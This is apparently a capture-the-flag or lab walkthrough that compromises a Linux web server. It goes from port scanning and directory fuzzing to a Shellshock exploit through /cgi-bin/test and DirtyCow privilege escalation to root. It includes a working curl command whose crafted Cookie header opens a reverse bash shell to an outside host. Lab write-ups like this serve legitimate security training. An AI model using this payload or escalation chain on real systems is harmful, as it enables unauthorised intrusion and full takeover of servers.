Enumeration is the name of the Game.
IP= 192.168.198.87

## Recon
```
└─# rustscan --ulimit=5000 --range=1-65535 -a 192.168.198.87 -- -sV
Open 192.168.198.87:22
Open 192.168.198.87:80
```
On the port 80 i found apache 2.2.22.
I fuzzed this port but nothing on it.
So I will re-Scan my nmap
```
└─# nmap -sV -Pn -p- --min-rate=5000 192.168.198.87 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
I will change a tool and use `ffuf`
```
└─# ffuf -u "http://192.168.198.87/FUZZ" -w /usr/share/wordlists/dirb/common.txt
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 177, Words: 22, Lines: 5, Duration: 261ms]
.htpasswd               [Status: 403, Size: 291, Words: 21, Lines: 11, Duration: 425ms]
.htaccess               [Status: 403, Size: 291, Words: 21, Lines: 11, Duration: 403ms]
.hta                    [Status: 403, Size: 286, Words: 21, Lines: 11, Duration: 415ms]
cgi-bin/                [Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 322ms]

```
Found 403 and the cgi-bin. so i will fuzz on that also
```
└─# ffuf -u "http://192.168.198.87/cgi-bin/FUZZ" -w /usr/share/wordlists/dirb/common.txt
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 231ms]
.htaccess               [Status: 403, Size: 299, Words: 21, Lines: 11, Duration: 398ms]
.htpasswd               [Status: 403, Size: 299, Words: 21, Lines: 11, Duration: 407ms]
.hta                    [Status: 403, Size: 294, Words: 21, Lines: 11, Duration: 398ms]
test                    [Status: 200, Size: 14, Words: 3, Lines: 2, Duration: 1540ms]
```
Wow i know that cgi-bin is shellshock.
Let confirm it
```
└─# nmap 192.168.198.87 -p80 --script=http-shellshock.nse --script-args uri=/cgi-bin/test
PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://seclists.org/oss-sec/2014/q3/685
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271



```
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi
https://github.com/erinzm/shellshocker
Getting a shell
```
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/192.168.45.167/1337 0>&1' http://192.168.198.87/cgi-bin/test


bash: no job control in this shell
www-data@ubuntu:/usr/lib/cgi-bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/usr/lib/cgi-bin$ whoami
whoami
www-data
www-data@ubuntu:/usr/lib/cgi-bin$ 
```
```
www-data@ubuntu:/usr/lib/cgi-bin$ cat local.txt
cat local.txt
41f9c81a048eb459cfe1e28b1d32bebe
www-data@ubuntu:/usr/lib/cgi-bin$ 

```
## Escalation
I will start by a 
```
www-data@ubuntu:/usr/lib/cgi-bin$ uname -a
uname -a
Linux ubuntu 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux

```
I will use exploit suggester.
```
[+] [CVE-2016-5195] dirtycow 2
[+] [CVE-2016-5195] dirtycow
```
Best : https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
instead of DirtyCow it's Vulnerable of this also https://www.exploit-db.com/exploits/33589?ref=infosecarticles.com

if you are exploiting dirtycow and then the gcc is not compiling correcty.
use this 
```
PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/;export PATH 
```
and then compile it 
```
└─# ssh firefart@192.168.180.87
The authenticity of host '192.168.180.87 (192.168.180.87)' can't be established.
ECDSA key fingerprint is SHA256:G8HZXu6SUrixt/obia/CUlTgdJK9JaFKXwulm6uUrbQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.180.87' (ECDSA) to the list of known hosts.
firefart@192.168.180.87's password: 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

firefart@ubuntu:~# ls
proof.txt  root.txt
firefart@ubuntu:~# 
firefart@ubuntu:~# cat proof.txt
2e86a08ec2e3940ad7983eb6cf7ffd20
firefart@ubuntu:~#
```